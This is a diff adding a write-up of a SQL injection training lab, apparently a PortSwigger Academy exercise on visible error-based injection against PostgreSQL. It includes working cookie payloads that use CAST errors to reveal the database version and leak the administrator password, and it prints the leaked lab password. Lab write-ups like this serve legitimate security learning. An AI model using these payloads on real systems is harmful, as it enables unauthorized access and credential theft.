@@ -16,3 +16,35 @@ The database contains a different table called users, with columns called userna
 To solve the lab, log in as the administrator user.
 
 ## Solution
+
+the script is found on `blind1.py`
+
+
+# Lab: Visible error-based SQL injection
+
+This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.
+
+The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account.
+
+## Solution
+
+1. Figure the type of db we're dealing with
+
+```
+KTfYtcR96JX6ia1u' || CAST((SELECT version()) as int)--
+```
+
+-> It's a PostgreSQL database
+
+Now, the idea is to trigger an error whenever you run a query, you can do that using
+concatenation with CAST(... as int). Note that we're met with character limit in our query.
+
+Knowing that user 'administrator' exists in the first row of users table (simple select with limit 1) confirms that.
+
+We can retrieve the password using
+
+```
+' || CAST((SELECT password FROM users LIMIT 1) as int)--
+```
+
+password in this case is: `jt5igk104tmx6sucbl86`
